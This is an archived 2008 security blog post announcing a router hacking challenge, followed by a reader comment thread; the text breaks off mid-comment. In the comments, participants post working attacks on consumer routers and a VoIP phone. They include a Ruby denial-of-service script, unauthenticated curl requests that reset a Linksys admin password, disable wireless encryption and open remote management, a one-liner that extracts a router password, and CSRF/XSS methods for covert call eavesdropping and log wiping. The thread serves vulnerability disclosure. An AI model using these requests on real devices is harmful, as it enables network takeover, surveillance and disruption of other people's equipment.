@@ -1,0 +1,1830 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Router Hacking Challenge</title><meta name="description" content="We want you to hack your router! Yes, You. We want you to hack your router and make your findings public on this very same page, the sla.ckers forum or at hackerwebzine[at]gmail[dot]com. The best and most interesting hacks will receive credit, a lot of attention and good media coverage."><meta property="name" content="Router Hacking Challenge"><meta itemprop="name" content="Router Hacking Challenge"><meta property="description" content="We want you to hack your router! Yes, You. We want you to hack your router and make your findings public on this very same page, the sla.ckers forum or at hackerwebzine[at]gmail[dot]com. The best and most interesting hacks will receive credit, a lot of attention and good media coverage."><meta itemprop="description" content="We want you to hack your router! Yes, You. We want you to hack your router and make your findings public on this very same page, the sla.ckers forum or at hackerwebzine[at]gmail[dot]com. The best and most interesting hacks will receive credit, a lot of attention and good media coverage."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Frouter-hacking-challenge%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Frouter-hacking-challenge%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/router-hacking-challenge/"><meta property="og:title" content="Router Hacking Challenge"><meta property="og:description" content="We want you to hack your router! Yes, You. We want you to hack your router and make your findings public on this very same page, the sla.ckers forum or at hackerwebzine[at]gmail[dot]com. The best and most interesting hacks will receive credit, a lot of attention and good media coverage."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Frouter-hacking-challenge%2F?w=1024"><meta name="twitter:title" content="Router Hacking Challenge"><meta name="twitter:description" content="We want you to hack your router! Yes, You. We want you to hack your router and make your findings public on this very same page, the sla.ckers forum or at hackerwebzine[at]gmail[dot]com. The best and most interesting hacks will receive credit, a lot of attention and good media coverage."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Frouter-hacking-challenge%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Router Hacking Challenge</h1><div>Sun, 03 Feb 2008 16:15:28 GMT</div><div id="post-content"><p>We want you to hack your router! Yes, You. We want you to hack your router and make your findings public on this very same page, the <a href="http://sla.ckers.org/forum/read.php?13,20128">sla.ckers</a> forum or at <em>hackerwebzine[at]gmail[dot]com</em>. The best and most interesting hacks will receive credit, a lot of attention and good media coverage.</p>
+<p>The challenge is supposed to run from 2nd February until 29th February, though it is something that is yet to be clarified because we know that there is a lot to be found.</p>
+<p>The reason why we do this is because we want you to help the community to map the current state of embedded devices vulnerabilities. GNUCITIZEN members <a href="/blog/hacking-the-interwebs">have</a> <a href="/blog/call-jacking">been</a> <a href="/blog/bt-home-flub-pwnin-the-bt-home-hub">actively</a> <a href="/blog/security-and-hacking-scene-in-london/">involved</a> with finding vulnerabilities in routers in the past. We believe that embedded devices hacking is a huge topic that is yet to be explored in depth. Your submissions will be included in numerous presentations and research materials and will be credited appropriately.</p>
+<blockquote>
+<p>The rules are very flexible, every kind of exploit is allowed: from buffer overflows to CSRF issues that plague many routers.</p>
+</blockquote>
+</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="udi"><span>udi</span><div class="post-comment-content">i have cisco 2514 and im willing to open it for public via telnet.
+
+please comment.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">udi, this is an interesting proposal but we are interested in you hacking your own appliance. send us your findings and we will publish them among the best hacks.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Bipin Upadhyay"><span>Bipin Upadhyay</span><div class="post-comment-content">MoRB (Month of Router Bugs) eh! :)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">Bipin, I guess so although it is kind of more distributed and slightly more playful. The main idea is to get a good picture of what's going on at the moment when it comes to router hacking. Feel free to advertise it as MoRB :) just to get people to join our friendly challenge although make sure that people should not expect having one vulnerability per day. The more people participate with their router hacks the more vulnerabilities we will be able to outline.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="loftgaia"><span>loftgaia</span><div class="post-comment-content"><pre><code>Manufacturer:Belkin
+Router model:F5D7230-4
+
+I have found a weekness in the way this router maintains access to the control panel.
+
+After a user enters the password sucessfuly in the control center,the router maintains access just by checking the ipaddress. 
+
+Lets suppose i have two computers in my LAN:
+PC1-192.168.2.3
+PC2-192.168.2.5
+
+I login to the control panel of the router with PC1.
+With PC2 i just need to change my IP address:
+ifconfig eth0 192.168.2.3
+
+and then i can change any settings in the router with PC2: DNS settings,firewall rules,ip forwarding,etc..
+
+No big deal,but works lol.</pre></code></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">loftgaia, 10x for participating. so basically the router is vulnerable to one of these IP-based session management attacks, Adrian was <a href="http://www.gnucitizen.org/blog/holes-in-embedded-devices-ip-based-session-management" rel="nofollow">talking</a> about.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content"><a href="http://sla.ckers.org/forum/profile.php?13,1758" rel="nofollow">dzman</a> has submitted the following <a href="http://sla.ckers.org/forum/read.php?13,20128" rel="nofollow">entry</a>:
+
+<pre><code>I've had some fun with my router: LinkSys WRT300N Firmware Version: 2.00.20
+Basically it uses XSS, the user does need to be logged into the admin area of the router for this to work.
+
+This will fetch the username/password of my PPPoE login, but with small modifications you can steal/adjust anything you want.
+
+Does not work in IE, probably some small problem but I don't use IE so whatever.
+Firefox and Safari are ok.
+
+Html file:
+<a href="http://code.bulix.org/cx46qa-65489" rel="nofollow">[code.bulix.org]</a>
+
+Javascript file:
+<a href="http://code.bulix.org/koom78-65490" rel="nofollow">[code.bulix.org]</a></code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">Come on guys, keep the hacks coming! There are literally MANY issues affecting embedded devices, many of which do *not* require low-level reverse engineering skills to be discovered.
+
+loftgaia, that sounds like a IP-based session management vulnerability. It's really concerning how many devices blindly trust the admin's source IP address after logging in, for authentication state reasons! Corporate networks sharing proxies are definitively at risk on this one.
+
+Also guys, we need to remember that the definition "consumer grade" devices is becoming very blurry these days as these "home" devices are also used by companies in SOHO networks. Exciting topic indeed!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="patrick"><span>patrick</span><div class="post-comment-content">@loftgaia: I have the same one and I noticed that the password is not encrypted. If you go to the systems settings and open the source, search for "http_passwd". It's a hidden input field. The password is stored in plaintext and you can easily change it without knowing it. You need to be logged in to view it, but since you can now hijack the session you can easily take control.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="loftgaia"><span>loftgaia</span><div class="post-comment-content"><pre><code>Sorry for double posting but the situation turned out to be worst than i first thought.
+
+I now have managed to change router configuration options without even logging in. If I try to access the html pages of the router it will ask for a password,but not the script that handles the request itself.So we just need to replay the http packets that actually perform the action.
+
+<strong>*No* authentication or spoofing is required.</strong>
+
+HTTP headers:
+
+POST /cgi-bin/setup_dns.exe
+Host: 192.168.2.1
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http&#58;//192.168.2.1/setup_dns.stm
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+
+HTTP body:
+page=setup_dns&amp;logout=&amp;dns1_1=1&amp;dns1_2=1&amp;dns1_3=1&amp;dns1_4=1&amp;dns2_1=2&amp;dns2_2=2&amp;dns2_3=2&amp;dns2_4=2
+
+After sending this the primary DNS server IP-address will get changed to 1.1.1.1 and secondary DNS server to 2.2.2.2 . I have tried changing other options without password and it worked all the time,disable firewall,reset to factory defaults,etc.. The page will still ask for a password...too bad the script didn't.This can obviously be triggered remotely for at least a couple of ways.
+
+<a href="http://d4.myfreefilehosting.com/d1/belkin.html" rel="nofollow">belkin.html</a>:	
+	Belkin Wireless G router F5D7230-4 Hole
+
+we can load in an iframe for example:
+	<a href="http://d2.myfreefilehosting.com/d1/page1.html" rel="nofollow">page1.html</a>
+
+Tomorrow i will be bying a new router.</pre></code></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="loftgaia"><span>loftgaia</span><div class="post-comment-content"><pre><code>Found another one.This time it only causes a DOS.
+
+http://d2.myfreefilehosting.com/d1/panel_dos.rb
+
+#!/usr/bin/env ruby
+#Author:loftgaia
+#Router: Belkin Wireless G Router F5D7230-4
+#After running this script nobody in the LAN
+#will be able to connect to the router control center.
+#A router restart is required to resume normal operation.
+#Internet traffic is still allowed to pass through ,this only causes a
+#DOS on the control center.
+ 
+#If we send a POST request with a Keep-Alive
+#header plus some random content in the body and
+#immediately close the socket,any connections to
+#the control center, from that point on are just
+#dropped by the router from *any* source.
+
+
+require 'socket'
+
+sock = TCPSocket.new("192.168.2.1",80)
+request = &lt;&lt;EOF
+POST /cgi-bin/setup_virtualserver.exe HTTP/1.1
+Host: 192.168.2.1
+Keep-Alive: 50
+Connection: Keep-Alive
+Content-Type: text/plain
+Content-Length: 10
+ansdfert=1
+EOF
+
+request.gsub!("&#92;n","&#92;r&#92;n")
+
+puts sock.write(request).to_s + " written&#92;n"
+
+sock.close</pre></code</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="hackathology"><span>hackathology</span><div class="post-comment-content">Check out my blog on the latest post. Basically there is a design flaw in CISCO firewall products.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@loftgaia - that auth bypass reminds me of the one found by Ginsu Rabbit on Linksys WRT54g home router, firmware revision 1.00.9: http://www.securityfocus.com/archive/1/442452/30/0/threaded
+
+This is what I like to call an "unprotected requests" authentication bypass vulnerability which I discussed on my "Cracking into embedded devices and beyond!" presentation:
+
+http://www.gnucitizen.org/blog/security-and-hacking-scene-in-london/cracking-into-embedded-devices-and-beyond.pdf
+
+However, way more material on this topic, including new tools and techniques will be presented at HITB Dubai: http://conference.hackinthebox.org/hitbsecconf2008dubai/?page_id=186</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="meathive"><span>meathive</span><div class="post-comment-content">I'm still working on this stuff so I've changed the URL I've supplied you (HackerWebzine).
+
+You may now find it here: http://kinqpinz.info/lib/wrt54g/own.txt
+I've also now got live demos running at: http://kinqpinz.info/lib/wrt54g/
+
+If you're running the same router or know someone who does, have them try these submissions and post their results.
+
+Greets,
+meathive</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">meathive, 10x for participating</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">meathive, submission follows:
+
+<pre><code>regurgitated by: meathive
+                                                       url: kinqpinz.info ;]
+				             Tue, 05 Feb 2008 07:51:41 -0700
+############################################################################
+WRT54G firmware version: v1.00.9
+Default LAN IP: 192.168.1.1
+Default auth: user:blank - pass:admin
+Authorization: Basic OmFkbWlu
+php &gt; print base64_decode("OmFkbWlu");
+:admin
+############################################################################
+
+                        /******************************
+			* No Authentication Required! *
+			******************************/
+			
+############################################################################
+What:
+restore basic setup options to default.
+
+Where:
+http&#58;//192.168.1.1/Basic.tri?dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.1&_daylight_time=1&wan_proto=0&router_name=WRT54G&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=0&dns0_1=0&dns0_2=0&dns0_3=0&dns1_0=0&dns1_1=0&dns1_2=0&dns1_3=0&dns2_0=0&dns2_1=0&dns2_2=0&dns2_3=0&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&daylight_time=ON&layout=en
+
+How: 
+curl -d "dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.1&_daylight_time=1&wan_proto=0&router_name=WRT54G&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=0&dns0_1=0&dns0_2=0&dns0_3=0&dns1_0=0&dns1_1=0&dns1_2=0&dns1_3=0&dns2_0=0&dns2_1=0&dns2_2=0&dns2_3=0&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&daylight_time=ON&layout=en" http&#58;//192.168.1.1/Basic.tri
+############################################################################
+What: 
+reset administrative password to 'asdf'.
+
+Where:
+http&#58;//192.168.1.1/manage.tri?remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=asdf&http_passwdConfirm=asdf&_http_enable=1&web_wl_filter=1&remote_management=0&upnp_enable=1&layout=en
+
+How:
+curl -d "remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=asdf&http_passwdConfirm=asdf&_http_enable=1&web_wl_filter=1&remote_management=0&upnp_enable=1&layout=en" http&#58;//192.168.1.1/manage.tri
+############################################################################
+What: 
+enable mixed wireless network mode with SSID 'pwnage' on channel 6, SSID broadcasting enabled.
+
+Where:
+http&#58;//192.168.1.1/WBasic.tri?submit_type=&channelno=11&OldWirelessMode=3&Mode=3&SSID=pwnage&channel=6&Freq=6&wl_closed=1&sesMode=1&layout=en
+
+How: 
+curl -d "submit_type=&channelno=11&OldWirelessMode=3&Mode=3&SSID=pwnage&channel=6&Freq=6&wl_closed=1&sesMode=1&layout=en" http&#58;//192.168.1.1/WBasic.tri 
+############################################################################
+What: 
+disable all wireless encryption.
+
+Where:
+http&#58;//192.168.1.1/Security.tri?SecurityMode=0&layout=en
+
+How: 
+curl -d "SecurityMode=0&layout=en" http&#58;//192.168.1.1/Security.tri
+############################################################################
+What: 
+disable wireless MAC filtering.
+
+Where:
+http&#58;//192.168.1.1/WFilter.tri?wl_macmode1=0
+
+How: 
+curl -d "wl_macmode1=0" http&#58;//192.168.1.1/WFilter.tri
+############################################################################
+What: 
+enable DMZ to ip 192.168.1.100.
+
+Where:
+http&#58;//192.168.1.1/dmz.tri?action=Apply&dmz_enable=1&dmz_ipaddr=100&layout=en
+
+How: 
+curl -d "action=Apply&dmz_enable=1&dmz_ipaddr=100&layout=en" http&#58;//192.168.1.1/dmz.tri
+############################################################################
+What: 
+disable DMZ.
+
+Where:
+http&#58;//192.168.1.1/dmz.tri?action=Apply&dmz_enable=0&layout=en
+
+How: 
+curl -d "action=Apply&dmz_enable=0&layout=en" http&#58;//192.168.1.1/dmz.tri
+############################################################################
+What: 
+enable remote management on port 31337 with password 'asdf', wireless web access and UPnP enabled.
+
+Where:
+http&#58;//192.168.1.1/manage.tri?remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=asdf&http_passwdConfirm=asdf&_http_enable=1&web_wl_filter=1&remote_management=1&http_wanport=31337&upnp_enable=1&layout=en
+
+How: 
+curl -d "remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=asdf&http_passwdConfirm=asdf&_http_enable=1&web_wl_filter=1&remote_management=1&http_wanport=31337&upnp_enable=1&layout=en" http&#58;//192.168.1.1/manage.tri
+############################################################################
+
+                        /******************************
+			******      Defaults:    ******
+			******************************/
+			
+############################################################################
+Setup-&gt;Basic Setup:
+POST /Basic.tri dhcp_end=149&oldMtu=1500&oldLanSubnet=0&OldWanMode=0&SDHCP1=192&SDHCP2=168&SDHCP3=1&SDHCP4=100&EDHCP1=192&EDHCP2=168&EDHCP3=1&EDHCP4=150&pd=&now_proto=dhcp&old_domain=&chg_lanip=192.168.1.1&_daylight_time=1&wan_proto=0&router_name=WRT54G&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=0&lan_proto=Enable&dhcp_start=100&dhcp_num=50&dhcp_lease=0&dns0_0=0&dns0_1=0&dns0_2=0&dns0_3=0&dns1_0=0&dns1_1=0&dns1_2=0&dns1_3=0&dns2_0=0&dns2_1=0&dns2_2=0&dns2_3=0&wins_0=0&wins_1=0&wins_2=0&wins_3=0&time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&daylight_time=ON&layout=en
+############################################################################
+Setup-&gt;DDNS:
+POST /ddns.tri ddns_enable=0
+############################################################################
+Setup-&gt;MAC Address Clone:
+POST /WanMac.tri action=Apply&mac_clone_enable=0
+############################################################################
+Setup-&gt;Advanced Routing:
+POST /AdvRoute.tri action=Apply&bSRoute=1&oldOpMode=0&wk_mode=0&route_page=0&route_name=&route_ipaddr_0=0&route_ipaddr_1=0&route_ipaddr_2=0&route_ipaddr_3=0&route_netmask_0=0&route_netmask_1=0&route_netmask_2=0&route_netmask_3=0&route_gateway_0=0&route_gateway_1=0&route_gateway_2=0&route_gateway_3=0&route_ifname=0
+############################################################################
+Wireless-&gt;Basic Wireless Settings:
+POST /WBasic.tri submit_type=&channelno=11&OldWirelessMode=3&Mode=3&SSID=linksys&channel=6&Freq=6&wl_closed=1&sesMode=1&layout=en
+############################################################################
+Wireless-&gt;Wireless Security:
+POST /Security.tri SecurityMode=0&layout=en
+############################################################################
+Wireless-&gt;Wireless MAC Filter:
+POST /WFilter.tri wl_macmode1=0
+############################################################################
+Wireless-&gt;Advanced Wireless Settings:
+POST /Advanced.tri AuthType=0&basicrate=default&wl_rate=0&wMode=3&sectype=0&ctspmode=off&FrameBurst=off&BeaconInterval=100&Dtim=1&FragLen=2346&RTSThre=2347&apisolation=0&apSESmode=1
+############################################################################
+Security-&gt;Firewall:
+POST /fw.tri ident_pass=1&action=Apply&block_wan=1&IGMP=1&_ident_pass=1
+############################################################################
+Security-&gt;VPN:
+POST /vpn.tri action=Apply&ipsec_pass=1&pptp_pass=1&l2tp_pass=1
+############################################################################
+Access Restrictions-&gt;Internet Access:
+POST /filter.tri action=Apply&f_id=0&f_status1=disable&f_name=&f_status2=1&day_all=1&time_all=1&FROM_AMPM=0&TO_AMPM=0&blocked_service0=NONE&blocked_service1=NONE&host0=&host1=&host2=&host3=&url0=&url1=&url2=&url3=&url4=&url5=
+############################################################################
+Applications & Gaming-&gt;Port Range Forward:
+POST /PortRange.tri action=Apply&RuleID_0=0&name0=&from0=0&to0=0&pro0=both&ip0=0&RuleID_1=0&name1=&from1=0&to1=0&pro1=both&ip1=0&RuleID_2=0&name2=&from2=0&to2=0&pro2=both&ip2=0&RuleID_3=0&name3=&from3=0&to3=0&pro3=both&ip3=0&RuleID_4=0&name4=&from4=0&to4=0&pro4=both&ip4=0&RuleID_5=0&name5=&from5=0&to5=0&pro5=both&ip5=0&RuleID_6=0&name6=&from6=0&to6=0&pro6=both&ip6=0&RuleID_7=0&name7=&from7=0&to7=0&pro7=both&ip7=0&RuleID_8=0&name8=&from8=0&to8=0&pro8=both&ip8=0&RuleID_9=0&name9=&from9=0&to9=0&pro9=both&ip9=0
+############################################################################
+Applications & Gaming-&gt;Port Triggering:
+POST /ptrigger.tri RuleID_0=&service_name0=&tfrom0=0&tto0=0&rfrom0=0&rto0=0&RuleID_1=&service_name1=&tfrom1=0&tto1=0&rfrom1=0&rto1=0&RuleID_2=&service_name2=&tfrom2=0&tto2=0&rfrom2=0&rto2=0&RuleID_3=&service_name3=&tfrom3=0&tto3=0&rfrom3=0&rto3=0&RuleID_4=&service_name4=&tfrom4=0&tto4=0&rfrom4=0&rto4=0&RuleID_5=&service_name5=&tfrom5=0&tto5=0&rfrom5=0&rto5=0&RuleID_6=&service_name6=&tfrom6=0&tto6=0&rfrom6=0&rto6=0&RuleID_7=&service_name7=&tfrom7=0&tto7=0&rfrom7=0&rto7=0&RuleID_8=&service_name8=&tfrom8=0&tto8=0&rfrom8=0&rto8=0&RuleID_9=&service_name9=&tfrom9=0&tto9=0&rfrom9=0&rto9=0&trinamelist=&layout=en
+############################################################################
+Applications & Gaming-&gt;DMZ:
+POST /dmz.tri action=Apply&dmz_enable=0&layout=en
+############################################################################
+Applications & Gaming-&gt;QoS:
+POST /qos.tri hport_priority_1=0&hport_priority_2=0&hport_priority_3=0&hport_priority_4=0&hport_flow_control_1=1&hport_flow_control_2=1&hport_flow_control_3=1&hport_flow_control_4=1&happname1=&hport1priority=0&happport1=0&happname2=&hport2priority=0&happport2=0&happname3=&hport3priority=0&happport3=0&happname4=&hport4priority=0&happport4=0&happname5=&hport5priority=0&happport5=0&happname6=&hport6priority=0&happport6=0&happname7=&hport7priority=0&happport7=0&happname8=&hport8priority=0&happport8=0&QoS=0&wl_wme=off&layout=en
+############################################################################
+Administration-&gt;Management:
+POST /manage.tri remote_mgt_https=0&http_enable=1&https_enable=0&PasswdModify=1&http_passwd=d6nw5v1x2pc7st9m&http_passwdConfirm=d6nw5v1x2pc7st9m&_http_enable=1&web_wl_filter=1&remote_management=0&upnp_enable=1&layout=en
+############################################################################
+Administration-&gt;Log:
+POST /ctlog.tri log_enable=0
+############################################################################
+Administration-&gt;Diagnostics-&gt;Ping:
+POST /ping.tri action=start&ping_ip=kinqpinz.info&ping_times=5
+############################################################################
+Administration-&gt;Diagnostics-&gt;Trace Route:
+POST /tracert.tri action=start&traceroute_ip=kinqpinz.info
+############################################################################
+Administration-&gt;Factory Defaults:
+############################################################################
+Administration-&gt;Firmware Upgrade:
+############################################################################
+Administration-&gt;Config Management:
+############################################################################
+Status-&gt;Router-&gt;DHCP Release:
+POST /rstatus.tri action=release&wan_pro=0&conn_stats=4294967295&layout=en
+############################################################################
+Status-&gt;Router-&gt;DHCP Renew:
+POST /rstatus.tri action=renew&wan_pro=0&conn_stats=4294967295&layout=en
+############################################################################
+Status-&gt;Local Network:
+############################################################################
+Status-&gt;Wireless:
+############################################################################</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">marios's <a href="http://sla.ckers.org/forum/read.php?13,20128,20229#msg-20229" rel="nofollow">submission</a> follows:
+
+<pre><code>There's a VoIP solution called Snom 320 - more info on that beast here: 
+[www.snom.com]
+
+It comes with a central phone server which features a web front-end. This 
+thing can't be password protected - I don't know why but it just is that way.
+
+there's an input field labeled "Call a number" - and this is done via regular 
+POST - no JS, no token - nothing. So - if you manage to get someone with this 
+thing in his intranet to visit a prepared site of yours you can make his phone 
+do loads of calls to everywhere in the world.
+
+[update]
+If you let the victim call yourself and you answer the phone you can hear the 
+victim talk without knowing that you are listening. Well done, Snom :)
+[/update]
+
+But - you might say - the victim will notice when watching his logs! Nope - he 
+won't. The logging application a a Flash file called snomControl.swf. If you 
+call let's say 100 numbers in a place really far away you just have to make 
+sure the last number you call is - tada:
+
+<strong>"');</strong>
+
+
+After that all other numbers that have ever been called aren't visible in the 
+log anymore since the Flash app kind of crashes internally and only shows the 
+calls made after the above mentioned one. I was too lazy to decompile it - 
+maybe later.
+
+So - CSRF all over the place but isn't it boring to just get the user to make 
+calls when he visits your prepared site? Yes - it is! You can CSRF a nice 
+persistent XSS into the address book. So anytime the user visits it you can 
+execute your script and do other stuff - like data mining, more calls, even 
+some more calls and so on.
+
+There is XSS which also enables you to XHR yourself through the whole front-end 
+and change arbitrary settings, like display names on the phone display, read 
+out settings and anything else you want. Might be bad if you call your boss 
+and some f-words appear on his display...
+
+Well, that's it for now - as said I dunno if this really counts but I consider 
+it a funny find anyway ;)</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt=".mario"><span>.mario</span><div class="post-comment-content">I wonder if the XSS will appear on our next phone bill ;)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">I am not sure about this one but here is an idea: what if you fill it with space for padding and write your own phone bill :) I am not sure what you are going to use it for but still...</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Ronald"><span>Ronald</span><div class="post-comment-content">Nice .mario! That is just badass incredible! hehe... good stuff so far.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt=".mario"><span>.mario</span><div class="post-comment-content">Or maybe some ascii art :)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">yep, that too... :)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="loftgaia"><span>loftgaia</span><div class="post-comment-content">@Adrian - it's amazing the flaws that one can find in these routers.That 2 years old, linksys flaw, is basically the same as this router's.
+
+It's alarming actually,to know that anyone can write an html page and obtain TOTAL control of my router.
+
+I hope this router-hacking challenge and your presentation at Dubai make people aware of how insecure some routers are.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="mutax"><span>mutax</span><div class="post-comment-content"><pre><code>bash one-liner for the Deutsche Telekom Speedport W500 DSL-Router (not the one running linux) to get the logon password from the - well - login-page:
+
+wget -q -O - 10.1.1.1/b_banner.stm  | sed -n "s/^pwd\ =\ '\(.*\)';/your routers password: \1/p"
+your routers password: xxxx
+
+That router seems to be a bug itself ;)
+
+mutax</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@meathive - that auth bypass issues appears to be the exact same finding published by Ginsu Rabbit which I mentioned on a previous comment: http://www.securityfocus.com/archive/1/442452/30/0/threaded
+
+GS posted the "disable wireless setting" request which matches yours: 
+
+<pre><code>curl -d "SecurityMode=0&amp;layout=en" http://192.168.0.1/Security.tri</code></pre>
+
+However, I must say that you documented your finding very nicely! Good job meathive!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@.mario - I'm wowed by your VoIP calls theft finding! wayyy cool stuff. you should find out if the IP phone responds to a certain domain name. i.e.: snom.phone
+
+also, please correct me if I'm wrong, but isn't there an infamous Snom IP phone model that comes with a built-in sniffer that can be accessed via the web console? I remember seeing it on these VoIP security slides somewhere but can't get hold of them. The slides even had a screenshot of the sniffing feature of the web console. Anyone seen this?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">mutax, 10x for submitting this entry!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">forgot to add :) 
+
+if the Snom IP phone does respond to a certain domain name, then the attacker doesn't need to predict the IP address of the device on the malicious page that causes the phone to call an arbitrary number!!!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content"><a href="http://sla.ckers.org/forum/profile.php?13,755" rel="nofollow">Gareth Heyes</a> has <a href="http://sla.ckers.org/forum/read.php?13,20128,20229#msg-20243" rel="nofollow">submitted</a> the following entry:
+
+<pre><code>I finally sat down and wrote a POC for my router, it's a DLink DSL-G604T. It's probably going in the bin after this :) I can read any 
+file on the router remotely and the entire thing can be CSRF'd to death. In the sample code I show how to read the config file (or any other file)
+and change the DNS settings to anything you like.
+
